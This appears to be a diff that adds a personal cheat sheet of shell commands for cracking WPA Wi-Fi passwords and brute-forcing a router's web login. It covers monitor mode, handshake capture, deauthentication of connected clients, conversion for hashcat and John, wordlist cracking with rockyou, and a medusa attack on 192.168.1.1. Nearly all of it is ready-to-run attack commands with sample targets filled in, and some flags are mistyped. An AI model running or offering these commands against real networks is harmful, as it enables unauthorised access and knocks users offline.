@@ -1,0 +1,70 @@
+brute force
+
+
+(hashcat/john)/aircrack-ng - locally cracking the 4-way handshake
+ifconfig down wlan0
+airmon-ng star wlan0
+ifconfig up wlan0
+airodump-ng wlan0mon --write capcha.pcap -c 11
+aireplay-ng --deauth 0 -a 11:22:33:44:55:66 wlan0mon
+	-should see: CH11 ][ Elapsed: 25 s ][ <Date / Time> ][ WPA handshake: **
+(hashcat64)
+cap2hccapx.bin capcha.cap capcha_out.hccapx
+(John)
+cap2hccapx.bin  -e '<ESSID>' capcha.cap capcha_out.hccapx
+hccap2john capture_out.hccapx > john_capcha
+	-git clone https://github.com/ZerBea/hcxtools.git
+	
+wireless
+john –incremental=all –stdout | aircrack-ng -a 2 -e WirelessNetwork WirelessNetwork-01.cap -w -
+john –incremental=all –session=WirelessBrute –stdout | aircrack-ng -a 2 -e WirelessNetwork WirelessNetwork-01.cap -w -
+john –restore=WirelessBrute | aircrack-ng -a 2 -e WirelessNetwork WirelessNetwork-01.cap -w -
+
+router
+john –incremental=all –session=RouterBrute –stdout | xargs -L 1 medusa -h 192.168.1.1 -u admin -M web-form -p
+john –restore=RouterBrute | xargs -L 1 medusa -h 192.168.1.1 -u admin -M web-form -p
+
+
+
+
+
+airmon-ng start wlan0
+airodump-ng mon0
+# replace -c and — bssid values with the values of your target network
+# -w specifies the directory where we will save the packet capture
+airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
+mv ./-01.cap hackme.cap
+cap2hccapx.bin hackme.cap hackme.hccapx
+# or hccap2john
+git clone https://github.com/brannondorsey/naive-hashcat
+cd naive-hashcat
+curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
+cat `locate hashcat.pot1`
+aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap
+# If the password is cracked you will see a KEY FOUND! message in the terminal followed by the plain text version of the network password.
+#
+# meow for deauth
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
+
+# XOR
+
+# put your network device into monitor mode
+airmon-ng start wlan0
+# listen for all nearby beacon frames to get target BSSID and channel
+airodump-ng mon0
+# start listening for the handshake
+airodump-ng -c 6 — bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0
+# optionally deauth a connected client to force a handshake
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
+########## crack password with aircrack-ng… ##########
+# download 134MB rockyou.txt dictionary file if needed
+curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+# crack w/ aircrack-ng
+aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap
+########## or crack password with naive-hashcat ##########
+# convert cap to hccapx
+cap2hccapx.bin capture/-01.cap capture/-01.hccapx
+# crack with naive-hashcat
+HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
